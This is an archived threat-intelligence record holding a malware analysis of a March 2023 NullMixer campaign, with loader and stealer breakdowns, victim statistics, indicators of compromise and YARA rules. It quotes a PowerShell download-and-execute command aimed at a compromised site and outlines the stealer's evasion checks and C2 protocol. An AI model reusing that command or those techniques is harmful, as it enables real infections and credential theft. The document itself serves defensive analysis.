{
    "id": "2f6dc40c-cf2a-42eb-84f5-f4c7d1be4af9",
    "created_at": "2023-04-05T02:09:10.580191Z",
    "updated_at": "2025-03-27T02:17:02.091126Z",
    "deleted_at": null,
    "sha1_hash": "10d9d6a68105def194e2c2fc0f6d781d2197ace0",
    "title": "2023-03-26 - Updates from the MaaS- new threats delivered through NullMixer",
    "authors": "",
    "file_creation_date": "2023-04-03T08:57:06Z",
    "file_modification_date": "2023-04-03T08:57:06Z",
    "file_size": 1741507,
    "plain_text": "# Updates from the MaaS: new threats delivered through NullMixer\n\n**[medium.com/@lcam/updates-from-the-maas-new-threats-delivered-through-nullmixer-d45defc260d1](https://medium.com/@lcam/updates-from-the-maas-new-threats-delivered-through-nullmixer-d45defc260d1)**\n\nL M March 28, 2023\n\nL M\n\nMar 27\n\n\n15 min read\n\n## Executive Summary\n\nOur insights into a recent NullMixer malware operation revealed Italy and France are\nthe favorite European countries from the opportunistic attackers’ perspective.\nIn thirty days, the operation we monitored was capable to establish initial access to\nover 8 thousand endpoints and steal sensitive data that are now reaching the\nunderground black markets.\n\n\n-----\n\nMost of the victims mount Windows 10 Professional and Enterprise operating systems,\nincluding several Datacenter versions of Windows Server. Some of them are also\nWindows Embedded, indicating the penetration of such malware operation even into\nIoT environments.\nThe NullMixer package is including new polymorphic loaders by third parties MaaS and\nPPI service providers in the underground markets, and also pieces of controversial,\npotentially North-Korean linked PseudoManuscript code.\n\n## Introduction\n\nDuring March 2023, we obtained information and data regarding an ongoing malware\noperation hitting more than 8.000 targets within a few weeks, with a particular emphasis on\nNorth American, Italian, and French targets.\n\nSuch was related to a worldwide malware operation known as NullMixer, a controversial and\nwidespread malware delivery maneuver based on SEO poisoning and social engineering\ntechnique to lure tech-savvy users, including IT personnel.\n\nThe insight from this attack wave revealed the presence of a controversial piece of code in\nthe delivered payloads, among additional loaders related to new MaaS and PPI operators.\n\n## Technical Analysis\n\nThere are two main key areas we technically analyzed during this investigation: first of all the\npresence of two unknown loaders entering the MaaS and PPI businesses (CrashedLoader\nand Koi), along with the presence of a controversial, potentially North-Korean linked piece of\nmalware, and secondly, we analyzed data about current successful infection rates on\ntargeted hosts.\n\n## The Originating Malvertising Campaign\n\nAccording to CTI investigation on the adversary infrastructure, we were able to identify an\nongoing campaign luring system administrators to install the malicious code into their\nmachines. In particular, the identified attack wave was designed to trick users to install\nbackdoored, cracked versions of notorious PC maintenance software such as “EaseUS\nPartition Master” and “Driver Easy Pro”, two well-known tools within the IT community.\n\nFilename: Driver Easy Pro Crack.exe\n\nMD5: 324db70fad161852fb9a12b202b6c8ad\n\nInvestigations end up in a series of Youtube videos promoting cracks for such programs. One\nof them presented a masked, hooded male hacker explaining how to use the crack linked in\nthe video description. The threat actor abused Bitly shortener and an ad hoc BlogSpot\n\n\n-----\n\naccount to protect the malicious code, lastly stored in an encrypted zip archive hosted on\nMega.nz.\n\nFigure. The final download link is presented on BlogSpot\nThis particular modus operandi matches a particular threat Kaspersky researchers spotted in\n[September 2022 (link): NullMixer. NullMixer is a worldwide spread criminal operation](https://securelist.com/nullmixer-oodles-of-trojans-in-a-single-dropper/107498/)\ndesigned to provide infection services to an oodle of criminal threat actors. In fact, its\noperators packed a multitude of malware into a single vector and then abused social\nengineering, SEO poisoning, and malvertising techniques to lure their victims into running\ntheir payloads.\n\nNullMixer is maintaining the same lure topic since September 2022, advertising fake\nsoftware pirate cracks targeting tech-savvy users and potentially even IT personnel and\nfreelancers.\n\nDuring their March 2023 infection wave, they evolved their social engineering techniques by\nproducing the above-mentioned YouTube videos containing instructions to download and run\nthe backdoored pirate software.\n\nFigure. NullMixer video operator\nDespite that evolution, NullMixer’s initial payload remains substantially the same: a WinRAR\nexecutable archive containing multiple binaries configured to be auto-launched on click. All at\nthe same time.\n\nFigure. Contents of the NullMixer executable\nThis plethora of malicious code related to different threat actors gives us the chance to better\nunderstand the evolutions in the cybercriminal underground. In fact, aside from the wellknown off-the-shelf info stealer we also observed the presence of more peculiar pieces of\ncode, including other unconventional malware loader services.\n\nCrack.exe, likely a “PseudoManuscrypt” loader, a particular kind of threat known since\nJune 2021 that Kaspersky attributes to the Chinese threat landscape, but, at the\nmoment, the speculation of the Lazarus (APT38) authorship of this piece of code does\nnot benefit enough confidence (, ).\nBrg.exe, a common RacconStealer with its command and control server hosted by\nVDSina, a Russian cloud provider.\nLower.exe, a sample of “GCleaner” spyware, historically, this piece of malware was\ninitially faking CCleaner to drop additional malware ().\nSqlcmd.exe, an interesting information stealer and dropper leveraging custom ECC\ncryptography to secure its communication (details below)\nKiffAppE2.exe, Crashtech Loader, a new loader service operating since November\n2022, malware details in the following subsection.\n\n\n-----\n\nss29.exe, a particular dropper loading a Fabookie wallet stealer retrieved from a jpeg\nimage, also leverages a google cloud endpoint to serve malicious PAC files to\nconfigure interception using an external HTTP proxy (T1090.002)\n\nThe following subsections will highlight some of the above-mentioned samples, especially\nthe loader ones to aim for a better understanding of the current MaaS landscape.\n\n## The CrashedTech Loader\n\nThe “KiffAppE2.exe” file is worth mentioning because it works as a secondary loader. This\n[loader appeared in the security community in November 2022 thanks to @fr3dhk, which](https://twitter.com/fr3dhk)\ngave it its current name “CrashedTech Loader” and its panel has already been added to the\n[“What Is This C2” collection (link).](https://github.com/luca-m/what_is_this_c2)\n\nFilename: KiffAppE2.exe\n\nHash: 53f9c2f2f1a755fc04130fd5e9fcaff4\n\nThe “KiffAppE2.exe” file is a .NET binary masking the loader code in plain sight, basically, it\nlaunches the loader code before showing the application form. It also checks a particular\nregistry key “KiffAppApi” under the HKCU hive to make sure the victim has not been already\ninfected, reasonably this would likely hurt the actor PPI model.\n\nFigure. Loader entry point\nThe loader code is pretty straightforward its main logic consists of two steps. First, it does a\ncheck-in providing user-name, os version, and public IP information to the “/addnew.php”\nendpoint on the C2, then it parses the server response to extract the location where to\ndownload further payloads. After this, it downloads the payload and executes it through the\n“Process.Start” .NET API.\n\nFigure. Loader checking and launch body\nDuring March 2023, this particular loader was dropping at least two distinct RedLine Stealer\npayloads configured to connect back to C2 servers hosted by the Ukrainian hosting provider\nTimehost.\n\n## The “Koi” Stealer/Loader\n\nAnother interesting piece of malware embedded in the NullMixer campaign we reference as\nATK-16 is the “sqlcmd.exe” binary, a 32bit MSVC binary.\n\nFilename: sqlcmd.exe\n\nHash: 6ffbbca108cfe838ca7138e381df210d\n\n\n-----\n\nAt a high level, the main routine of this loader does two things: insistently tries to download\nmultiple executable files with the name pattern “ab[NUMBER].php” and “ab[NUMBER].exe”\nfrom a statically configured location, and runs an additional inline PowerShell command to\ndownload and execute more code.\n\nFigure. Command string to retrieve executable PowerShell code\n\n“C:\\WINDOWS\\sysnative\\cmd.exe” /c “powershell -command IEX(New-Object\nNet.Webclient).DownloadString(‘https://neutropharma .com/wp/wpcontent/debug2.ps1’)”\n\nThis particular sample of the loader downloads the PowerShell script from a Pakistani\ncompromised WordPress site. The typical names we observed to be downloaded are\n“debug2.ps1”, “debug20.ps1”, “debug4.ps1” and so on. The downloaded script contains a\nlong chunk of bytes and a sort of decryption routine base on a textbook-looking xor\noperation, after that, the resulting bytes are loaded as a .NET assembly module.\n\nFigure. Binary encoded data inside PowerShell and decryption routine.\nThe key to decrypting the embedded code is served through an external check-in service,\nimplementing a multi-stage polymorphic protection scheme. Such initial C2 service also\nprovides additional malware configuration including campaign Id and additional command\nand control locations.\n\nFigure. Dynamic configuration served by the C2\nDuring March 2023, the resulting binary is a .NET file packed with ConfuseEx v1.0.0. Once\ndecoded, the malicious payload results in a .NET module named “koi” and implements\ninformation stealer functionalities such as password stealing from FileZilla, Chrome browser,\nand Discord, crypto-wallets stealing, Telegram folder exfiltration, Vpn configurations, and it\nalso looks for the presence of hardware wallet like Trezor, probably to identify high-value\ntargets for cryptocurrency theft. The module also exfiltrates 2FA secrets from Twilio’s Authy\nlocal storage.\n\nFilename: “koi” (dumped)\n\nHash: 9725ec075e92e25ea5b6e99c35c7aa74\n\nBefore starting all these collection operations, the “koi” module invokes the “checkVal”\nfunction to avoid unwanted targets. In particular, it uses mutex “99759703-b8b4–4cb2–8329–\n76f908b004f0” to avoid re-infection and also checks for the presence of video controller of\nthe Wine emulation framework, along with common user names and computer names used\nby sandboxes or by AV emulation routines.\n\nFigure. Basic defense evasion checks\nThe module also avoids the execution of the malicious stealer routines if the system\nlanguage is set to one of the values representing the CIS countries:\n\n\n-----\n\nAZ: Azerbaijan\nAM: Armenia\nBY: Belarus\nKZ: Kazakhstan\nKG: Kyrgyzstan\nMD: Moldova\nRU: Russia\nTJ: Tajikistan\nTM: Turkmenistan\nUZ: Uzbekistan\n\nFigure. CIS countries check\nAfter that, the “koi” module starts gathering information about system installed software and\nsets up a communication channel with the command and control service received as a\nstartup parameter, in this case, the Latvian IP address 195.123.211,56.\n\nThis malware communicates with its command and control in a curious manner: it redirects\ncertain memory streams directly to the remote server, this way, malware authors were able to\navoid touching the disk even to lay temporary data before exfiltration. The first message sent\nto the C2 starts with the “CONFIG|” keyword and contains check-in information among with\nthe campaign Id passed to the module via its PowerShell loader. Then, C2 triages the\ninfected host and responds in two possible ways: if “D” is returned, the “koi” module stops its\noperations, otherwise, the command would contain additional commands and the malicious\ncode starts gathering even more data from the infected host.\n\nIn detail, a valid response from the C2 server would look like this:\n\nLDR “|” (DO|AND|OR) “|” (On|Off) “|” ( list “,” list “,” .. ) “|” url “|” suffix\n\nHere the C2 server asks the bot to download and execute an additional payload from the\nremote location specified as “url”.\n\nAll these communications happen in plain HTTP, but despite that, messages are not easy to\nspot because the “koi” module encrypts messages using a custom protocol based on ECC\nencryption.\n\nFigure. Classes in the “koi” module\nIn fact, the C2 communication leverages custom implementation ECC with Curve25519 to\ngenerate a shared secret key that would be used to encrypt the otherwise plain HTTP body.\nIn particular, the communication protection scheme of this piece of malware works as\nfollows:\n\nThe server “peer-key” is hardcoded into the packed .NET module’s Main function.\nBots “public-key” and “private-key” are randomly generated at process startup time.\n\n\n-----\n\nA shared secret is computed starting from the bots private-key and the server s\n“peer-key”.\nThe shared secret is used to encrypt the GZipped memory stream using a xor-based\nalgorithm in a compress-then-encrypt fashion.\n\nFigure. Shared Secret methods from Curve25519 implementation\nTo make all this work, the final message sent to the C2 server will also need to contain the\nbot “public-key” and here a detection opportunity emerges: the HTTP body of the generated\nrequest is created concatenating 32 bytes of the randomly generated bot “public-key”, a\nstatic separator “K”, and then the encrypted stream.\n\nFigure. Message encryption routine\n\n## Attack Wave Insights\n\nBased on the analysis of the C2 infrastructures involved in this NullMixer wave (ATK-16), we\nobtained insights about successfully infected hosts. In particular, we were able to obtain\nevidence of the successful execution of at least one of the payloads within the target\nmachines.\n\nThe NullMixer operations we dissected (ATK-16) count victims in at least 87 countries. With\nan average infraction rate of 297 new victims per day, the malicious actors behind hit over 8\nthousand in less than 30 days. Peaks of operations show an intensification of the activities\nstarting from the 28th of February 2023 when the infection rate jumped sensibly higher.\n\nFigure. Reconstruction of the infection operations activities.\n\n## Impacted Countries\n\nDuring the March spike period, the malicious operators significantly expanded their\ncampaign among countries outside North America: this wave hit many European countries\nincluding Italy (4.57%, in fourth position) and France (3.38%, in sixth position).\n\nFigure. Target map of the ATK-16\nStarting from the infected hosts’ data available, the infection progression shows the clear\nhorizontal expansion of the attacked surface corresponding to the above-mentioned peak on\nthe 28th of February.\n\nFigure. Infected host timeline per country\n\n## Target Profile\n\n\n-----\n\nAs we expected the majority of the targeted hosts mount Microsoft client operations systems:\n56.8 % Windows 10 Pro and 25.35 % Windows 10 Home, indicating major of the targets are\nmicro or small businesses or private users. Despite that, we noticed interesting outliers, 5.3\n% of the victims mount the Enterprise version of the Microsoft OS, and almost 71 hosts also\nmount the Windows Server version of the Microsoft operating system.\n\nThe majority of the data extracted from the victims will likely reach the underground dark\nmarkets soon, but for this latest portion of infected hosts the risk is even higher: the operator\nwill likely try to sell access to these servers and enterprise machines to even more\ndangerous thirds parties, including well-known ransomware operators.\n\nFigure. Operating systems of infected machines\nIn the end, we also noticed that five machines that got infected were running even a rarer\nversion of the Microsoft operating system: Windows Embedded, an indication that even\nWindows-based IoT devices have been hit by this campaign.\n\n## Conclusions\n\nAfter 9 months, the NullMixer operation evolved leveraging malicious video tutorials\nincreasing its penetration on tech-savvy users and revealing new potential players in the\nMaaS ecosystems.\n\nThe data we accessed during this investigation lighted up the impacted victims of their latest\ncampaign, revealing Italy as the first European target hit by the March 2023 infection wave.\nDuring the recent period, Italy has been heavily targeted by cyber attacks, especially from\nyoung collectives of cyber-partisans supporting the Kremlin’s propaganda such as Killnet and\nNoName057. Such criminals base their operations on volunteer and micro-criminal labor\nforces typically among the eastern CIS countries, for this reason, a spike observing such\npenetration against Italian hosts becomes particularly interesting, especially with the current\ngeopolitical and cyber temperature against the Italian peninsula.\n\nTechnical details of the victims, adversary infrastructure, and indicators of compromise have\nbeen shared with local authorities and the national CSIRT.\n\n## Indicator of Compromise\n\n\n-----\n\n```\n[ATK 16]\nMalvertising:\ns://www.youtube.com/watch?v=67UdCa9AbPA\n\nDropurl:\ns://bit.ly/3IqujMB\ns://crackfinddownload.blogspot.com/2023/02/your-download-link-httpswww.html\ns://mega.nz/file/SRgjGSpL#wDXn2ER24p_e43NwPOtQaa - EelC5MNO5iVhC3CGcuc (5123)\n\nEmbeddings:\nb2efceab3748f46e64091e87b1767abf brg.exe\ne299ac0fd27e67160225400bdd27366f Crack.exe\n53f9c2f2f1a755fc04130fd5e9fcaff4 KiffAppE2.exe\naaa7586b2e64363b85571195a01b14e9 lower.exe\n6ffbbca108cfe838ca7138e381df210d sqlcmd.exe\nc4ffe80effddba0b8d9f82988464c5d0 ss29.exe\n\nC2 (Crashedtech loader):\nttp://crashedff.xyz/addnew.php\n47.90.167,104\n\nC2 (Redline):\nhrabrlonian,xyz:81\n45.130.151,133\n\nC2 (Fabookie Stealer):\ncount.iiagjaggg .com\n154.221.31,191\nttp://34.80.59,191/win.pac\nttp://34.80.59,191:8183/\n\nC2 (koi Stealer/Loader):\nttp://195.123.211,56/index.php\n\nC2 (PseudoManuscrypt):\ns://j.ffbbjjkk,com/25.html\ns://j.ffbbjjkk,com/logo.png\ns://h.ffbbhhtt,com/api6.php\n\n```\n\n-----\n\n```\nC2 (gcleaner):\nttp://45.12.253,56/advertisting/plus.php\n45.12.253,56\n45.12.253,72\n45.12.253,98\n\nC2 (Raccon Stealer):\nttp://91.201.115,148\nMutex (koi):Global\\\\99759703-b8b4–4cb2–8329–76f908b004f0\n\n## Yara Rules\n\n```\n\n-----\n\n```\nrule crashedtech_loader {\n  meta:\n    author = \"@luc4m\"\n    date = \"2023-03-26\"\n    hash_md5 = \"53f9c2f2f1a755fc04130fd5e9fcaff4\"\n    link = \"https://medium.com/@lcam/updates-from-the-maas-new-threats-deliveredthrough-nullmixer-d45defc260d1\"\n    tlp = \"WHITE\"\n  strings:\n    $trait_0 = {02 14 7d ?? ?? ?? ?? 02 28 ?? ?? ?? ?? ?? ?? 02 28 ?? ?? ?? ?? ??\n2a}\n    $trait_1 = {?? 02 7b ?? ?? ?? ?? 6f ?? ?? ?? ?? ?? ?? 02 03 28 ?? ?? ?? ?? ??\n2a}\n    $trait_2 = {?? 28 ?? ?? ?? ?? 72 ?? ?? ?? ?? 7e ?? ?? ?? ?? 6f ?? ?? ?? ?? 0a\n2b ??}\n    $trait_4 = {?? 73 ?? ?? ?? ?? 02 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0a 2b ??}\n    $trait_5 = {06 6f ?? ?? ?? ?? ?? dc ?? de ?? 26 ?? ?? de ?? 2a}\n    $trait_6 = {11 ?? 6f ?? ?? ?? ?? ?? dc 09 6f ?? ?? ?? ?? 16 fe 01 13 ?? 11 ??\n2c ??}\n    $trait_7 = {06 6f ?? ?? ?? ?? ?? dc ?? de ?? 26 ?? ?? de ?? 2a}\n    $trait_8 = {?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0a 28 ?? ?? ?? ?? 06 6f ?? ?? ??\n?? 0b 2b ??}\n\n    $str_0 = \"username\" wide\n    $str_1 = \"windows\" wide\n    $str_2 = \"client\" wide\n    $str_3 = \"ip\" wide\n    $str_4 = \"api.ipify.org\" wide\n    $str_5 = \"(.*)<>(.*)\" wide\n\n  condition:\n    5 of ($str_* ) and 3 of ($trait_*)\n}\n\nrule sqlcmd_loader {\n  meta:\n    author = \"@luc4m\"\n    date = \"2023-03-26\"\n    hash_md5 = \"6ffbbca108cfe838ca7138e381df210d\"\n    link = \"https://medium.com/@lcam/updates-from-the-maas-new-threats-deliveredthrough-nullmixer-d45defc260d1\"\n    tlp = \"WHITE\"\n  strings:\n    $trait_0 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 ec 04 00\n00}\n    $trait_1 = {85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 9f 04 00 00}\n    $trait_2 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 7d 04 00\n\n```\n\n-----\n\n```\n00}\n    $trait_3 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 5b 04 00\n00}\n    $trait_4 = {6a 20 59 2b d9 03 f1 03 d1 3b d9 0f 83 5f fb ff ff}\n    $trait_5 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 e3 03 00\n00}\n    $trait_6 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 c1 03 00\n00}\n    $trait_7 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 9f 03 00\n00}\n    $trait_8 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 4c 03 00\n00}\n    $trait_9 = {33 c9 85 ff 0f 9f c1 8d 0c 4d ?? ?? ?? ?? 85 c9 0f 85 2a 03 00\n00}\n\n $str_0 = /debug[0-9]{1,3}\\.ps1/i wide\n $str_1 = \"%s\\\\\\\\sysnative\\\\\\\\%s\" wide\n $str_2 = \"/c \\\\\\\"powershell \" wide\n $str_3 = \"%s/ab%d.exe\" wide\n $str_4 = \"%s/ab%d.php\" wide\n\n  condition:\n    (5 of ($trait_*)) and (3 of ($str_*))\n}\n\nrule koi_loader {\n  meta:\n    author = \"@luc4m\"\n    date = \"2023-03-26\"\n    link = \"https://medium.com/@lcam/updates-from-the-maas-new-threats-deliveredthrough-nullmixer-d45defc260d1\"\n    hash_md5 = \"9725ec075e92e25ea5b6e99c35c7aa74\"\n    tlp = \"WHITE\"\n  strings:\n\n $tm_0 = /debug[0-9]{1,3}\\.ps1/i wide\n $tm_1 = \"First stage size: {0}\" wide\n $tm_2 = \"Second stage size: {0}\" wide\n $tm_3 = \"Telegram Desktop\\\\tdata\" wide\n $tm_4 = \"Executed \" wide\n $tm_5 = \" or downloading \" wide\n $tm_6 = \"LDR\" wide\n\n```\n\n-----\n\n```\n $curve_0 key must be 32 bytes long (but was {0} bytes long) wide\n $curve_1 = \"rawKey must be 32 bytes long (but was {0} bytes long)\" wide\n $curve_2 = \"rawKey\" wide\n $curve_3 = \"key\" wide\n\n  condition:\n     (5 of ($tm_*)) and (1 of ($curve_*))\n}\nrule fabookie_stealer {  meta:    author = \"@luc4m\"    date = \"2023-03-26\" \nlink = \"https://medium.com/@lcam/updates-from-the-maas-new-threats-delivered-throughnullmixer-d45defc260d1\"    hash_md5 = \"901ce391f5d25a12282e7ff436a5e62a\"    \ntlp = \"WHITE\"  strings:    $trait_0 = {48 89 5c 24 ?? 48 89 74 24 ?? 57 48 83\nec 20 49 8b f8 8b da 48 8b f1 83 fa 01 75 05}    $trait_1 = {48 89 48 ?? 48 8b 41\n?? 49 89 41 ?? 48 8b 07 48 3b 48 ?? 75 06}    $trait_2 = {4c 89 48 ?? 49 89 09 4c\n89 49 ?? 48 8b 42 ?? 40 38 70 ?? 0f 84 3b fe ff ff}    $trait_3 = {49 8b 42 ?? c6\n40 ?? ?? 48 8b 5c 24 ?? 49 8b c0 48 8b 74 24 ?? 48 8b 7c 24 ?? c3}    $trait_4 =\n{83 67 ?? ?? 48 8b 5c 24 ?? 48 c7 47 ?? ?? ?? ?? ?? c6 07 00 48 83 c4 20 5f c3}   \n$trait_5 = {83 67 ?? ?? 48 8b 5c 24 ?? 48 c7 47 ?? ?? ?? ?? ?? c6 07 00 48 83 c4 20\n5f c3}    $trait_6 = {4c 8b 41 ?? 48 83 c2 27 49 2b c8 48 8d 41 ?? 48 83 f8 1f 77\n44}    $trait_7 = {18 e8 be e0 00 00 48 8b 4b ?? e8 a5 5d 04 00 48 8d 05 ?? ?? ??\n?? 48 89 03 40 f6 c7 01 74 0d}    $trait_8 = {ba 30 00 00 00 48 8b cb e8 98 e0 00\n00 48 8b c3 48 8b 5c 24 ?? 48 83 c4 20 5f c3}    $trait_9 = {4d 30 e8 65 4f f8 ff\n90 ?? ?? ?? ?? 39 70 ?? 72 03}  condition:    5 of them}\n\n```\nMany thanks to @3rb3ru5d3d53c for binlex!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-26 - Updates from the MaaS- new threats delivered through NullMixer.pdf"
    ],
    "report_names": [
        "2023-03-26 - Updates from the MaaS- new threats delivered through NullMixer.pdf"
    ],
    "threat_actors": [
        {
            "id": "4f472ea8-b147-486d-8533-88f8036343a6",
            "created_at": "2024-01-23T13:22:35.081084Z",
            "updated_at": "2025-03-27T02:00:03.285792Z",
            "deleted_at": null,
            "main_name": "Cyber Partisans",
            "aliases": [],
            "source_name": "MISPGALAXY:Cyber Partisans",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f426f0a0-faef-4c0e-bcf8-88974116c9d0",
            "created_at": "2022-10-25T15:50:23.240383Z",
            "updated_at": "2025-03-27T02:00:55.404232Z",
            "deleted_at": null,
            "main_name": "APT38",
            "aliases": [
                "APT38",
                "NICKEL GLADSTONE",
                "BeagleBoyz",
                "Bluenoroff",
                "Stardust Chollima",
                "Sapphire Sleet",
                "COPERNICIUM"
            ],
            "source_name": "MITRE:APT38",
            "tools": [
                "ECCENTRICBANDWAGON",
                "HOPLIGHT",
                "Mimikatz",
                "KillDisk",
                "DarkComet"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b4a6d558-3cba-499c-b58a-f15d65b7a604",
            "created_at": "2023-01-06T13:46:39.346924Z",
            "updated_at": "2025-03-27T02:00:03.056948Z",
            "deleted_at": null,
            "main_name": "Killnet",
            "aliases": [],
            "source_name": "MISPGALAXY:Killnet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "b05a0147-3a98-44d3-9b42-90d43f626a8b",
            "created_at": "2023-01-06T13:46:39.467088Z",
            "updated_at": "2025-03-27T02:00:03.100909Z",
            "deleted_at": null,
            "main_name": "NoName057(16)",
            "aliases": [
                "Nnm05716",
                "NoName057",
                "NoName05716",
                "05716nnm"
            ],
            "source_name": "MISPGALAXY:NoName057(16)",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1680660550,
    "ts_updated_at": 1743041822,
    "ts_creation_date": 1680512226,
    "ts_modification_date": 1680512226,
    "files": {
        "pdf": "https://archive.orkl.eu/10d9d6a68105def194e2c2fc0f6d781d2197ace0.pdf",
        "text": "https://archive.orkl.eu/10d9d6a68105def194e2c2fc0f6d781d2197ace0.txt",
        "img": "https://archive.orkl.eu/10d9d6a68105def194e2c2fc0f6d781d2197ace0.jpg"
    }
}